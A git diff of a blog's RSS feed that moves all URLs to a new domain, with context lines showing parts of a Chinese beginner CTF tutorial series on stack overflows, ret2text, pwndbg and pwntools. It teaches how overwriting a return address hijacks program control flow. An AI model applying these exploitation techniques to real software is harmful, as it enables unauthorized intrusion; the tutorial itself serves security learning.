+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part4---ret2text/s_hu9786b2549c7d9b9bfe806264788a882a_29606_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part4---ret2text/s_hu9786b2549c7d9b9bfe806264788a882a_29606_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;把思路用图片的形式解释下吧.qaq&#34;
@@ -2978,10 +2978,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;h3 id=&#34;精心构造恶意数据&#34;&gt;精心构造恶意数据&lt;/h3&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/of.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part4---ret2text/of.png&#34;
 	width=&#34;877&#34;
 	height=&#34;418&#34;
-	srcset=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/of_hu265d6c91663920ba0b132793828898e6_26788_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/of_hu265d6c91663920ba0b132793828898e6_26788_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part4---ret2text/of_hu265d6c91663920ba0b132793828898e6_26788_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part4---ret2text/of_hu265d6c91663920ba0b132793828898e6_26788_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;栈溢出发生时栈帧的情况(32位程序)&#34;
@@ -3013,10 +3013,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;一直下一步直到输入(虽说本次只需要一次)&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;n
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输入8个A测试一下&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/n.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part4---ret2text/n.png&#34;
 	width=&#34;1145&#34;
 	height=&#34;620&#34;
-	srcset=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/n_huc568db901354378ff555ada67fedb758_589868_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/n_huc568db901354378ff555ada67fedb758_589868_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part4---ret2text/n_huc568db901354378ff555ada67fedb758_589868_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part4---ret2text/n_huc568db901354378ff555ada67fedb758_589868_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;AAAAAAAA&#34;
@@ -3065,10 +3065,10 @@
 &lt;blockquote&gt;
 &lt;p&gt;Tip: IDA是个懒家伙，那个值默认是16进制，但它没有加上前缀0x, &lt;strong&gt;使用这个值的时候自行加上&lt;/strong&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/addr.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part4---ret2text/addr.png&#34;
 	width=&#34;1603&#34;
 	height=&#34;649&#34;
-	srcset=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/addr_hufc7bd90cca90fc04a46b76253cae3bd5_119084_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/addr_hufc7bd90cca90fc04a46b76253cae3bd5_119084_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part4---ret2text/addr_hufc7bd90cca90fc04a46b76253cae3bd5_119084_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part4---ret2text/addr_hufc7bd90cca90fc04a46b76253cae3bd5_119084_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;get_shel1()地址&#34;
@@ -3167,11 +3167,11 @@
         </item>
         <item>
         <title>PWN! PWN! PANG! Part3 --- 栈溢出基础</title>
-        <link>https://blog.nanosec.site/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/</link>
+        <link>https://kira-pgr.github.io/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/</link>
         <pubDate>Mon, 07 Feb 2022 07:51:10 -0500</pubDate>
         
-        <guid>https://blog.nanosec.site/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/</guid>
-        <description>&lt;img src="https://blog.nanosec.site/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/cover.jpg" alt="Featured image of post PWN! PWN! PANG! Part3 --- 栈溢出基础" /&gt;&lt;h1 id=&#34;pwn-pwn-pang-part3&#34;&gt;PWN! PWN! PANG! Part3&lt;/h1&gt;
+        <guid>https://kira-pgr.github.io/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/</guid>
+        <description>&lt;img src="https://kira-pgr.github.io/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/cover.jpg" alt="Featured image of post PWN! PWN! PANG! Part3 --- 栈溢出基础" /&gt;&lt;h1 id=&#34;pwn-pwn-pang-part3&#34;&gt;PWN! PWN! PANG! Part3&lt;/h1&gt;
 &lt;p&gt;&lt;del&gt;这是一篇黑暗童话故事 确信)&lt;/del&gt;&lt;/p&gt;
 &lt;p&gt;至于简介嘛= =，好奇的话就把文章看完吧qaq&lt;/p&gt;
 &lt;h2 id=&#34;c语言函数调用栈&#34;&gt;C语言函数调用栈&lt;/h2&gt;
@@ -3193,10 +3193,10 @@
 &lt;p&gt;函数调用栈在内存中从高地址向低地址生长，所以栈顶对应的内存地址在压栈时变小，退栈时变大&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/Picture1.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/Picture1.png&#34;
 	width=&#34;720&#34;
 	height=&#34;436&#34;
-	srcset=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/Picture1_hua3215175d30be75c1a5e0aecb5a41d2e_59156_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/Picture1_hua3215175d30be75c1a5e0aecb5a41d2e_59156_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/Picture1_hua3215175d30be75c1a5e0aecb5a41d2e_59156_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/Picture1_hua3215175d30be75c1a5e0aecb5a41d2e_59156_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;配图&#34;
@@ -3210,10 +3210,10 @@
 &lt;h3 id=&#34;关于栈帧&#34;&gt;关于栈帧&lt;/h3&gt;
 &lt;p&gt;咳咳，上面很官方的解释是不是不容易理解.qwq.&lt;/p&gt;
 &lt;p&gt;实际上上面所说的&amp;quot;函数的状态&amp;quot;在栈中是由一个一个栈帧&lt;code&gt;(Stack Frame)&lt;/code&gt;表示的，基本上 &lt;em&gt;(特殊情况的话，可能是某些在main函数前调用的函数)&lt;/em&gt; 每一个函数调用时在栈中都有自己的栈帧&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/SF.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/SF.png&#34;
 	width=&#34;1342&#34;
 	height=&#34;694&#34;
-	srcset=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/SF_hu956c5e946f835811fb7c23d45c55c874_55318_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/SF_hu956c5e946f835811fb7c23d45c55c874_55318_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/SF_hu956c5e946f835811fb7c23d45c55c874_55318_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/SF_hu956c5e946f835811fb7c23d45c55c874_55318_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;栈帧结构预览&#34;
@@ -3247,10 +3247,10 @@
 &lt;blockquote&gt;
 &lt;p&gt;注意， 参数是逆序压栈滴&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/Picture2.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/Picture2.png&#34;
 	width=&#34;491&#34;
 	height=&#34;404&#34;
-	srcset=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/Picture2_hu28d44f6886cecc62fc1a726825bfcdb9_45105_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/Picture2_hu28d44f6886cecc62fc1a726825bfcdb9_45105_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/Picture2_hu28d44f6886cecc62fc1a726825bfcdb9_45105_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/Picture2_hu28d44f6886cecc62fc1a726825bfcdb9_45105_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;参数的保存&#34;
@@ -3264,10 +3264,10 @@
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;返回地址&lt;code&gt;(Return Address)&lt;/code&gt;保存了调用子函数前&lt;code&gt;eip&lt;/code&gt;值，&lt;strong&gt;这个值在我们栈溢出攻击中至关重要&lt;/strong&gt;，控制这个值之后就可以劫持程序执行流，让程序下一步执行你想要的指令&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/Picture4.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/Picture4.png&#34;
 	width=&#34;488&#34;
 	height=&#34;440&#34;
-	srcset=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/Picture4_huab1f888d28fd87b4a869877e28b8d989_56057_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/Picture4_huab1f888d28fd87b4a869877e28b8d989_56057_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/Picture4_huab1f888d28fd87b4a869877e28b8d989_56057_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/Picture4_huab1f888d28fd87b4a869877e28b8d989_56057_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;返回地址的位置&#34;
@@ -3281,10 +3281,10 @@
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;&lt;code&gt;(Caller&#39;s ebp / Previous ebp&lt;/code&gt;保存这父函数&lt;code&gt;ebp&lt;/code&gt;的值，长度为一个字长(x32系统4Byte, x64系统8Byte)&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/Picture5.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/Picture5.jpg&#34;
 	width=&#34;489&#34;
 	height=&#34;491&#34;
-	srcset=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/Picture5_hu8e0753edcc36675983dedbac963ebd8c_45102_480x0_resize_q75_box.jpg 480w, https://blog.nanosec.site/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/Picture5_hu8e0753edcc36675983dedbac963ebd8c_45102_1024x0_resize_q75_box.jpg 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/Picture5_hu8e0753edcc36675983dedbac963ebd8c_45102_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/Picture5_hu8e0753edcc36675983dedbac963ebd8c_45102_1024x0_resize_q75_box.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;prev ebp&#34;
@@ -3298,10 +3298,10 @@
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;局部变量&lt;code&gt;(Local Variables)&lt;/code&gt;一般是发生栈溢出攻击的地方，主要是因为程序在局部变量中读入了超长的数据，造成溢出覆盖了其他内容(比如说返回地址)&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/Picture6.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/Picture6.png&#34;
 	width=&#34;449&#34;
 	height=&#34;512&#34;
-	srcset=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/Picture6_hu555916ab67ea4f952e250669e0dfcc79_74322_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/Picture6_hu555916ab67ea4f952e250669e0dfcc79_74322_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/Picture6_hu555916ab67ea4f952e250669e0dfcc79_74322_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/Picture6_hu555916ab67ea4f952e250669e0dfcc79_74322_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Local Var&#34;
@@ -3344,11 +3344,11 @@
         </item>
         <item>
         <title>PWN! PWN! PANG! Part2 --- 工具的使用</title>
-        <link>https://blog.nanosec.site/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</link>
+        <link>https://kira-pgr.github.io/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</link>
         <pubDate>Sat, 29 Jan 2022 21:35:29 -0500</pubDate>
         
-        <guid>https://blog.nanosec.site/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</guid>
-        <description>&lt;img src="https://blog.nanosec.site/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/cover.jpg" alt="Featured image of post PWN! PWN! PANG! Part2 --- 工具的使用" /&gt;&lt;h1 id=&#34;pwn-pwn-pang-part2&#34;&gt;PWN! PWN! PANG! Part2&lt;/h1&gt;
+        <guid>https://kira-pgr.github.io/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</guid>
+        <description>&lt;img src="https://kira-pgr.github.io/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/cover.jpg" alt="Featured image of post PWN! PWN! PANG! Part2 --- 工具的使用" /&gt;&lt;h1 id=&#34;pwn-pwn-pang-part2&#34;&gt;PWN! PWN! PANG! Part2&lt;/h1&gt;
 &lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
 &lt;p&gt;说完了前面那些基础 &lt;del&gt;(貌似一点也不基础)&lt;/del&gt; 知识，今天再来谈谈工具&lt;/p&gt;
 &lt;p&gt;由于我们研究的是Linux下的PWN,&lt;strong&gt;接下来的操作请在Linux下进行&lt;/strong&gt;&lt;/p&gt;
@@ -3368,10 +3368,10 @@
 &lt;hr&gt;
 &lt;h2 id=&#34;pwndbg&#34;&gt;PWNDBG&lt;/h2&gt;
 &lt;p&gt;pwndbg是Linux GDB的一个专门为PWN设计的一个插件, 能有助于我们&lt;del&gt;调戏&lt;/del&gt;调试程序&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/1.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/1.png&#34;
 	width=&#34;1164&#34;
 	height=&#34;712&#34;
-	srcset=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/1_huda1e99c4adc499292a3b87cae3a80bac_745836_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/1_huda1e99c4adc499292a3b87cae3a80bac_745836_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/1_huda1e99c4adc499292a3b87cae3a80bac_745836_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/1_huda1e99c4adc499292a3b87cae3a80bac_745836_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;pwndbg&#34;
@@ -3416,10 +3416,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;s        &lt;span class=&#34;c1&#34;&gt;#进入函数&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;q        &lt;span class=&#34;c1&#34;&gt;#退出gdb&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;至于pwndbg的特殊功能嘛= =，&lt;strong&gt;可以通过指令&lt;code&gt;pwndbg&lt;/code&gt;查看&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/pwndbg.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/pwndbg.png&#34;
 	width=&#34;1133&#34;
 	height=&#34;719&#34;
-	srcset=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/pwndbg_hu4a8fe27ede4dbc984c67bac06fa6cf6c_663694_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/pwndbg_hu4a8fe27ede4dbc984c67bac06fa6cf6c_663694_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/pwndbg_hu4a8fe27ede4dbc984c67bac06fa6cf6c_663694_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/pwndbg_hu4a8fe27ede4dbc984c67bac06fa6cf6c_663694_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;pwndbg指令&#34;
@@ -3461,10 +3461,10 @@
 &lt;p&gt;PS: 如果终端提示权限不够，请给程序加上可执行权限&lt;/p&gt;
 &lt;p&gt;chmod +x tools&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/2.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/2.png&#34;
 	width=&#34;1146&#34;
 	height=&#34;712&#34;
-	srcset=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/2_hu8d8bc83acf62da5116ca7f65ad34848b_497539_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/2_hu8d8bc83acf62da5116ca7f65ad34848b_497539_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/2_hu8d8bc83acf62da5116ca7f65ad34848b_497539_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/2_hu8d8bc83acf62da5116ca7f65ad34848b_497539_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;小程序长这样纸&#34;
@@ -3513,10 +3513,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ZmxhZ3tuMHRfZjRzdGVyX3Q2YW5feTB1fQo=&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Maybe I will tell you again when you clever than ELSEpush ......&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; 
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/pwned.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/pwned.png&#34;
 	width=&#34;1138&#34;
 	height=&#34;673&#34;
-	srcset=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/pwned_hue1856b9b3afa3464f05aa1d3e572745d_582296_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/pwned_hue1856b9b3afa3464f05aa1d3e572745d_582296_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/pwned_hue1856b9b3afa3464f05aa1d3e572745d_582296_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/pwned_hue1856b9b3afa3464f05aa1d3e572745d_582296_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;PWNed!&#34;
@@ -3535,19 +3535,19 @@
         </item>
         <item>
         <title>Web安全--浏览器信息伪造</title>
-        <link>https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/</link>
+        <link>https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/</link>
         <pubDate>Fri, 28 Jan 2022 22:53:47 -0500</pubDate>
         
-        <guid>https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/</guid>
